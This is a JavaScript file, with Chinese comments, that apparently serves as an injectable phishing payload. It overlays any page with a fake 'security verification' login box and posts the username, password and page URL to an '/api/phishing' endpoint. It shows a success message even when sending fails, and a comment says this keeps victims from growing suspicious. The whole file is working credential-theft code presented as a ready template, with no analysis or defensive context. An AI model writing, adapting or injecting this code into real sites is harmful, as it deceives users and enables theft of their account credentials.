// 登录钓鱼模板
// 在页面上插入一个仿冒的登录框

// 创建样式
const style = document.createElement('style');
style.textContent = `
.overlay-container {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.7);
  z-index: 9999;
  display: flex;
  justify-content: center;
  align-items: center;
}

.login-form {
  background-color: white;
  padding: 20px;
  border-radius: 5px;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
  width: 300px;
}

.login-form h2 {
  margin-top: 0;
  color: #333;
  text-align: center;
}

.login-form p {
  color: #666;
  font-size: 14px;
  margin-bottom: 20px;
  text-align: center;
}

.form-group {
  margin-bottom: 15px;
}

.form-group label {
  display: block;
  margin-bottom: 5px;
  font-weight: bold;
  color: #555;
}

.form-group input {
  width: 100%;
  padding: 8px;
  border: 1px solid #ddd;
  border-radius: 4px;
  box-sizing: border-box;
}

.form-group button {
  width: 100%;
  padding: 10px;
  background-color: #0066cc;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  font-weight: bold;
}

.form-group button:hover {
  background-color: #0055b3;
}

.close-btn {
  position: absolute;
  top: 10px;
  right: 10px;
  background: none;
  border: none;
  color: white;
  font-size: 24px;
  cursor: pointer;
}
`;

// 创建登录表单
function createLoginForm() {
  const overlay = document.createElement('div');
  overlay.className = 'overlay-container';
  
  const closeBtn = document.createElement('button');
  closeBtn.className = 'close-btn';
  closeBtn.innerHTML = '&times;';
  closeBtn.onclick = function() {
    document.body.removeChild(overlay);
  };
  
  const form = document.createElement('div');
  form.className = 'login-form';
  
  const title = document.createElement('h2');
  title.textContent = '安全验证';
  
  const message = document.createElement('p');
  message.textContent = '您的账号需要重新验证，请输入您的用户名和密码';
  
  const usernameGroup = document.createElement('div');
  usernameGroup.className = 'form-group';
  
  const usernameLabel = document.createElement('label');
  usernameLabel.textContent = '用户名:';
  
  const usernameInput = document.createElement('input');
  usernameInput.type = 'text';
  usernameInput.placeholder = '请输入用户名';
  
  usernameGroup.appendChild(usernameLabel);
  usernameGroup.appendChild(usernameInput);
  
  const passwordGroup = document.createElement('div');
  passwordGroup.className = 'form-group';
  
  const passwordLabel = document.createElement('label');
  passwordLabel.textContent = '密码:';
  
  const passwordInput = document.createElement('input');
  passwordInput.type = 'password';
  passwordInput.placeholder = '请输入密码';
  
  passwordGroup.appendChild(passwordLabel);
  passwordGroup.appendChild(passwordInput);
  
  const submitGroup = document.createElement('div');
  submitGroup.className = 'form-group';
  
  const submitButton = document.createElement('button');
  submitButton.textContent = '验证';
  submitButton.onclick = function(e) {
    e.preventDefault();
    const credentials = {
      username: usernameInput.value,
      password: passwordInput.value,
      url: window.location.href,
      timestamp: new Date().toISOString()
    };
    
    // 发送凭据到服务器
    fetch('/api/phishing', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials)
    })
    .then(() => {
      // 移除登录表单
      document.body.removeChild(overlay);
      // 显示成功消息
      alert('验证成功，感谢您的配合！');
    })
    .catch(() => {
      // 即使失败也显示成功，避免用户怀疑
      document.body.removeChild(overlay);
      alert('验证成功，感谢您的配合！');
    });
  };
  
  submitGroup.appendChild(submitButton);
  
  form.appendChild(title);
  form.appendChild(message);
  form.appendChild(usernameGroup);
  form.appendChild(passwordGroup);
  form.appendChild(submitGroup);
  
  overlay.appendChild(closeBtn);
  overlay.appendChild(form);
  
  return overlay;
}

// 添加样式到页面
document.head.appendChild(style);

// 显示登录表单
const loginForm = createLoginForm();
document.body.appendChild(loginForm);

// 返回执行结果
return "钓鱼登录表单已插入页面";